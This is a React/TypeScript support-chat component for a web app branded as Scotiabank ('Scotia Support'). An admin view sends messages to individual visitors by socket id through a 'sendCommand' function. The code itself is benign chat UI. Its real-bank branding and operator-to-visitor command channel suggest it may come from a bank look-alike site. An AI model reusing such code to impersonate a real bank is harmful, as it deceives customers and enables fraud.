import React, { useState, useEffect, useRef } from 'react';
import { X, Send } from 'lucide-react';
import { useSocket } from '../shared/SocketContext';
import { useBank } from '../shared/BankContext';

export const SupportChat: React.FC<{ 
  isAdmin?: boolean; 
  targetSocketId?: string;
  onClose?: () => void;
  isOpen?: boolean;
}> = ({ isAdmin, targetSocketId, onClose, isOpen }) => {
  const [messages, setMessages] = useState<{ sender: string; text: string; timestamp: number }[]>([]);
  const [input, setInput] = useState('');
  const { socket, sendCommand } = useSocket();
  const { user } = useBank();
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!socket) return;

    const handleChatMessage = (data: { from: string; message: string; to?: string }) => {
      // If I'm the admin, I want to see messages from the user I'm chatting with
      // If I'm a user, I want to see messages from 'admin'
      const isRelevant = isAdmin 
        ? (data.from === targetSocketId || data.to === targetSocketId)
        : (data.from === 'admin' || data.from === user?.username);

      if (isRelevant) {
        const newMsg = { 
          sender: data.from === 'admin' ? 'Support' : (data.from === user?.username ? 'You' : data.from), 
          text: data.message, 
          timestamp: Date.now() 
        };
        setMessages(prev => [...prev, newMsg]);
        
        // Show notification if chat is not open and it's from admin
        if (!isOpen && !isAdmin && data.from === 'admin') {
          window.dispatchEvent(new CustomEvent('scotia_notification', { 
            detail: { 
              title: 'Scotia Support', 
              message: data.message,
              type: 'chat'
            } 
          }));
        }
      }
    };

    socket.on('chat_message', handleChatMessage);
    return () => { socket.off('chat_message', handleChatMessage); };
  }, [socket, isOpen, isAdmin, targetSocketId, user?.username]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const sendMessage = () => {
    if (!input.trim()) return;
    
    if (isAdmin && targetSocketId) {
      sendCommand(targetSocketId, 'chat_message', { message: input });
      setMessages(prev => [...prev, { sender: 'You', text: input, timestamp: Date.now() }]);
    } else if (!isAdmin && socket) {
      socket.emit('chat_message', { from: user?.username || 'User', message: input });
      setMessages(prev => [...prev, { sender: 'You', text: input, timestamp: Date.now() }]);
    }
    setInput('');
  };

  if (!isOpen && !isAdmin) return null;

  return (
    <div className={`fixed inset-0 bg-white z-[2000] flex flex-col ${isAdmin ? 'relative h-full' : ''}`}>
      <div className="p-4 bg-[#ED0711] text-white flex items-center gap-4 shrink-0 pt-12">
        {!isAdmin && (
          <button onClick={onClose} className="p-1 hover:bg-white/10 rounded-full">
            <X size={24} />
          </button>
        )}
        <div className="flex-1">
          <h3 className="font-bold text-lg">Support Chat</h3>
          <p className="text-xs opacity-80">We're here to help 24/7</p>
        </div>
      </div>
      
      <div className="flex-1 p-4 overflow-y-auto space-y-4 bg-gray-50">
        <div className="text-center py-4">
          <p className="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Today</p>
        </div>
        
        {messages.length === 0 && (
          <div className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 text-center">
            <p className="text-sm text-gray-500">How can we help you today?</p>
          </div>
        )}

        {messages.map((msg, i) => (
          <div key={i} className={`flex flex-col ${msg.sender === 'You' ? 'items-end' : 'items-start'}`}>
            <div className={`max-w-[80%] p-3 rounded-2xl text-sm shadow-sm ${
              msg.sender === 'You' 
                ? 'bg-[#ED0711] text-white rounded-tr-none' 
                : 'bg-white text-gray-800 rounded-tl-none border border-gray-100'
            }`}>
              {msg.text}
            </div>
            <span className="text-[10px] text-gray-400 mt-1 px-1">
              {new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
            </span>
          </div>
        ))}
        <div ref={messagesEndRef} />
      </div>

      <div className="p-4 bg-white border-t border-gray-100 flex gap-2 items-center pb-8">
        <input 
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyPress={(e) => e.key === 'Enter' && sendMessage()}
          className="flex-1 p-3 bg-gray-100 rounded-2xl text-sm focus:outline-none focus:ring-2 focus:ring-[#ED0711]/20 transition-all"
          placeholder="Type your message..."
        />
        <button 
          onClick={sendMessage} 
          disabled={!input.trim()}
          className="p-3 bg-[#ED0711] text-white rounded-2xl disabled:opacity-50 disabled:grayscale transition-all active:scale-95"
        >
          <Send size={20} />
        </button>
      </div>
    </div>
  );
};
